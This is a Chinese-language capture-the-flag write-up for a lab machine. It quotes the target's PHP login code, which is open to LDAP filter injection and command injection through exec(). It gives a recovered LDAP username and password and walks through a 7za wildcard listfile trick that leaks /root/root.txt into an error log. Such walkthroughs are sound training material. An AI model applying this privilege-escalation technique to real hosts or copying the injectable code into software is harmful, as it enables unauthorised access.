### 代码优化

```php
<?php
if (!ldap_connect($ds)) {
    echo "Could not set LDAPv3\n";
} elseif (!ldap_start_tls($ds)) {
    echo "Could not start secure TLS connection\n";
} else {
    // Bind to the LDAP server
    $bth = ldap_bind($ds, $dn, $password) or die("Could not connect to LDAP server\n");

    // Define and refine the search filter
    $filter = "(&(objectClass=inetOrgPerson)(uid=$username2)(pager=*))";

    // Perform the search
    if ($search = @ldap_search($ds, $basedn, $filter)) {
        $info = ldap_get_entries($ds, $search);
        if ($info['count'] > 0) {
            $token_string = $info[0]['pager'][0];
            $token = exec("/usr/bin/stoken --token=$token_string --pin=0000");
            
            if ($token == $OPT1) {
                $strErrorMsg = "Login ok";
                $_SESSION['username'] = $username1;
                header('Location: /page.php');
                exit();
            } else {
                $strErrorMsg = "Cannot login";
            }
        } else {
            $strErrorMsg = "User $username1 not found";
        }
    }
}
?>
```

### 获取用户名和密码

```bash
$username = 'ldapuser';
$password = 'e398e27d5c4ad45086fe431120932a01';

# SSH 登录
root@kali:~# ssh PI:EMAIL
The authenticity of host '10.10.10.122 (10.10.10.122)' can't be established.
ECDSA key fingerprint is SHA256:N1/2S6I/kcd5HDQzbSvAZVI7yHQQgz+XmLdhk6yVHh4.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.122' (ECDSA) to the list of known hosts.
PI:EMAIL's password:
[ldapuser@ctf ~]$ ls
user.txt
[ldapuser@ctf ~]$ cat user.txt
74a8exxxxxxxxxxxxxxxx4ee585
```

### Wildcard 提权

在根目录下发现一个 `backup` 文件夹，其中包含一些备份文件、脚本和错误日志。

```bash
[ldapuser@ctf backup]$ ls
backup.1564391941.zip  backup.1564392121.zip  backup.1564392301.zip  backup.1564392481.zip  honeypot.sh
backup.1564392001.zip  backup.1564392181.zip  backup.1564392361.zip  backup.1564392541.zip
backup.1564392061.zip  backup.1564392241.zip  backup.1564392421.zip  error.log
```

#### `honeypot.sh` 脚本

```bash
# 更新被 ban 的 IP 并更新 banned.txt
/usr/sbin/ipset list | grep fail2ban -A 7 | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u > /var/www/html/banned.txt

# 生成备份文件名和密码
now=$(date +"%s")
filename="backup.$now"
pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk '{print $1}')

# 保留最近的 10 个备份
cd /backup
ls -1t *.zip | tail -n +11 | xargs rm -f

# 备份上传文件
cd /var/www/html/uploads
7za a /backup/$filename.zip -t7z -snl -p$pass -- *

# 清理上传目录
rm -rf -- *

# 清空错误日志
truncate -s 0 /backup/error.log
```

该脚本用于更新被 ban 的 IP，定期备份 `/var/www/html/uploads` 中的文件，并使用 7za 进行压缩后保存到 `/backup` 目录中。压缩包的密码是通过读取 `/root/root.txt` 生成的，因此这个定时任务具有 root 权限。

#### 利用通配符进行提权

重点关注 7za 压缩命令中的通配符 `*`。可以通过创建软链接将 `/root/root.txt` 链接到 `/var/www/html/uploads/root.txt`，并利用 7za 读取 listfile 的特性来触发报错信息写入 `error.log`。

步骤如下：
1. 在 `uploads` 目录中新建一个 `@root.txt` 文件。
2. 将 `/root/root.txt` 软链接到 `/var/www/html/uploads/root.txt`。
3. 由于通配符的原因，`@root.txt` 会被 7za 当作 listfile 读取，但由于 `uploads` 目录中不存在以 `root.txt` 内容为扩展名的文件，将会产生报错信息并写入 `error.log`。

查看 `uploads` 目录的权限：

```bash
[ldapuser@ctf html]$ ls -al
total 36
drwxr-xr-x. 6 root   root    176 Oct 23  2018 .
drwxr-xr-x. 4 root   root     33 Jun 27  2018 ..
-rw-r--r--. 1 root   root      0 Jul 30 03:48 banned.txt
-rw-r-----. 1 root   apache 1424 Oct 23  2018 cover.css
drwxr-x--x. 2 root   apache 4096 Oct 23  2018 css
drwxr-x--x. 4 root   apache   27 Oct 23  2018 dist
-rw-r-----. 1 root   apache 2592 Oct 23  2018 index.html
drwxr-x--x. 2 root   apache  242 Oct 23  2018 js
-rw-r-----. 1 root   apache 5021 Oct 23  2018 login.php
-rw-r-----. 1 root   apache   68 Oct 23  2018 logout.php
-rw-r-----. 1 root   apache 5245 Oct 23  2018 page.php
-rw-r-----. 1 root   apache 2324 Oct 23  2018 status.php
drwxr-x--x. 2 apache apache    6 Oct 23  2018 uploads
```

等待定时任务执行，并监控 `error.log` 文件：

```bash
[ldapuser@ctf backup]$ tail -f error.log
WARNING: No more files
fd6dxxxxxxxxxxxxxxxxxxx40c79ba053
tail: error.log: file truncated
```

在日常维护中，管理员编写运维脚本时喜欢使用通配符，这往往会导致一些安全问题。这种技巧在渗透测试中非常实用，值得学习。